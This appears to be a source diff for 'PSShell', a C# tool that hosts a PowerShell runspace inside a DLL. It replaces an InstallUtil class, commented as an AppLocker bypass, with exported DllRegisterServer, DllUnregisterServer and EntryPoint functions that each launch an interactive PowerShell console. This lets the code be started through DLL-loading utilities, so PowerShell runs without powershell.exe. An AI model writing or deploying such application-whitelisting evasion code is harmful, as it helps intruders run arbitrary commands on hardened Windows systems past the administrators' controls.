@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Diagnostics;
 using System.IO;
 using System.Collections.Generic;
 using System.Collections.ObjectModel;
@@ -7,29 +8,32 @@ using System.Threading.Tasks;
 using System.Management.Automation;
 using System.Management.Automation.Host;
 using System.Management.Automation.Runspaces;
+using RGiesecke.DllExport;
+using System.Runtime.InteropServices;
+using Microsoft.Win32.SafeHandles;
 
 namespace PSShell
 {
-    [System.ComponentModel.RunInstaller(true)]
-    public class InstallUtil : System.Configuration.Install.Installer
+    public class WinApp
     {
-        // @subTee app locker bypass
-        public override void Install(System.Collections.IDictionary savedState)
-        {
+        [DllImport("kernel32.dll", EntryPoint = "GetStdHandle", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
+        private static extern IntPtr GetStdHandle(int nStdHandle);
+        [DllImport("kernel32.dll", EntryPoint = "AllocConsole", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
+        private static extern int AllocConsole();
+        private const int STD_OUTPUT_HANDLE = -11;
+        private const int MY_CODE_PAGE = 437;
 
-        }
-
-        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
-        public override void Uninstall(System.Collections.IDictionary savedState)
+        public void winshell()
         {
-            Program.Main();
-        }
-    }
+            AllocConsole();
+            IntPtr stdHandle = GetStdHandle(STD_OUTPUT_HANDLE);
+            SafeFileHandle safeFileHandle = new SafeFileHandle(stdHandle, true);
+            FileStream fileStream = new FileStream(safeFileHandle, FileAccess.Write);
+            Encoding encoding = System.Text.Encoding.GetEncoding(MY_CODE_PAGE);
+            StreamWriter standardOutput = new StreamWriter(fileStream, encoding);
+            standardOutput.AutoFlush = true;
+            Console.SetOut(standardOutput);
 
-    public class Program
-    {
-        public static void Main()
-        {
             Console.Title = "PSShell - rui@deniable.org";
             Runspace runspace = RunspaceFactory.CreateRunspace();
             runspace.Open();
@@ -61,6 +65,30 @@ namespace PSShell
 
             runspace.Close();
             Environment.Exit(0);
+        }
+    }
+
+    class Program
+    {
+        [DllExport("EntryPoint", CallingConvention = CallingConvention.StdCall)]
+        public static void EntryPoint()
+        {
+            PSShell.WinApp app = new PSShell.WinApp();
+            app.winshell();
+        }
+
+        [DllExport("DllRegisterServer", CallingConvention = CallingConvention.StdCall)]
+        public static void DllRegisterServer()
+        {
+            PSShell.WinApp app = new PSShell.WinApp();
+            app.winshell();
+        }
+
+        [DllExport("DllUnregisterServer", CallingConvention = CallingConvention.StdCall)]
+        public static void DllUnregisterServer()
+        {
+            PSShell.WinApp app = new PSShell.WinApp();
+            app.winshell();
         }
     }
 }
